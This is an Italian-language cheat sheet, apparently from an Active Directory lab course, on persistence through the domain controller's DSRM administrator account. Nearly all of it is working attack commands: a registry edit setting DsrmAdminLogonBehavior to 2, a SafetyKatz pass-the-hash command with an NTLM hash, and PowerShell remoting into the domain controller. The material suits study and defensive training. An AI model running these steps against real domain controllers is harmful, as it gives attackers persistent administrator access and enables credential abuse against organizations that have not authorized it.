# Persistence - DSRM3

* Essendo il Local Administrator del DC, possiamo usare il pass-the-hash per autenticarsi
* Il Logon behavior dell'account DSRM deve essere cambiato prima di usare l'hash

```powershell
winrs -r:dcorp-dc cmd
```

```powershell
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v
"DsrmAdminLogonBehavior" /t REG_DWORD /d 2 /f
```

* Utilizza il seguente comando per fare pass-the-hash con il DSRM Administrator e accedere il DC

```powershell
SafetyKatz.exe "sekurlsa::pth /domain:dcorp-dc
/user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd
/run:powershell.exe"
```

```powershell
Set-Item WSMan:\localhost\Client\TrustedHosts 172.16.2.1
```

```powershell
Enter-PSSession -ComputerName 172.16.2.1 -Authentication
NegotiateWithImplicitCredential
```
